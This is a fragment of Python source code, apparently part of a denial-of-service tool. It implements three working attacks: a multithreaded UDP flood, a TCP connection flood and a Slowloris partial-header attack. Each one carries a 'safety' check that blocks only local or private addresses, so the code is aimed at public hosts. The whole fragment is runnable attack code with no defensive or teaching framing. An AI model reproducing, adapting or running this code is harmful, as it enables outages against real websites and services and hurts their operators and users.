    def udp_flood(self, target: str, port: int, duration: int, pps: int):
        """UDP amplification-style flood (raw datagrams)."""
        if not self.safety.is_safe(target):
            print(f"{C.R}[!] SAFETY BLOCK: Target is local/private. Aborting.{C.END}")
            return

        host = target.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
        self.running = True
        self.stats = {"sent": 0, "success": 0, "fail": 0, "start": time.time()}
        end = time.time() + duration
        payload = random.randbytes(1024)

        def worker():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            while self.running and time.time() < end:
                try:
                    sock.sendto(payload, (host, port))
                    self._inc("sent")
                    self._inc("success")
                except Exception:
                    self._inc("fail")
                time.sleep(1.0 / max(pps, 1))
            sock.close()

        threads = []
        for _ in range(min(50, pps // 10 + 1)):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            threads.append(t)
        for t in threads:
            t.join(timeout=duration + 2)
        self.running = False

    def tcp_syn_flood(self, target: str, port: int, duration: int, concurrency: int):
        """TCP connection flood (rapid connect/close)."""
        if not self.safety.is_safe(target):
            print(f"{C.R}[!] SAFETY BLOCK: Target is local/private. Aborting.{C.END}")
            return

        host = target.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
        self.running = True
        self.stats = {"sent": 0, "success": 0, "fail": 0, "start": time.time()}
        end = time.time() + duration

        def worker():
            while self.running and time.time() < end:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(2)
                    s.connect((host, port))
                    s.close()
                    self._inc("sent")
                    self._inc("success")
                except Exception:
                    self._inc("fail")
                    self._inc("sent")

        threads = []
        for _ in range(concurrency):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            threads.append(t)
        for t in threads:
            t.join(timeout=duration + 2)
        self.running = False

    def slowloris(self, target: str, duration: int, sockets_count: int):
        """Slowloris-style partial HTTP headers."""
        if not self.safety.is_safe(target):
            print(f"{C.R}[!] SAFETY BLOCK: Target is local/private. Aborting.{C.END}")
            return

        host = target.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
        port = 80
        if ":" in host:
            host, port = host.split(":")[0], int(host.split(":")[1])
        self.running = True
        self.stats = {"sent": 0, "success": 0, "fail": 0, "start": time.time()}
        end = time.time() + duration
        sockets = []

        def create_socket():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((host, port))
                s.send(f"GET /?{random.randint(0,9999)} HTTP/1.1\r\n".encode())
                s.send(f"Host: {host}\r\n".encode())
                s.send(b"User-Agent: Mozilla/5.0\r\n")
                s.send(b"Accept-language: en-US,en\r\n")
                return s
            except Exception:
                return None

        for _ in range(sockets_count):
            s = create_socket()
            if s:
                sockets.append(s)
                self._inc("success")
            self._inc("sent")

        while self.running and time.time() < end:
            for s in list(sockets):
                try:
                    s.send(f"X-a: {random.randint(1,5000)}\r\n".encode())
                    self._inc("sent")
                except Exception:
                    sockets.remove(s)
                    ns = create_socket()
                    if ns:
                        sockets.append(ns)
            time.sleep(10)
        for s in sockets:
            try:
                s.close()
            except Exception:
                pass
        self.running = False

    def stop(self):
        self.running = False

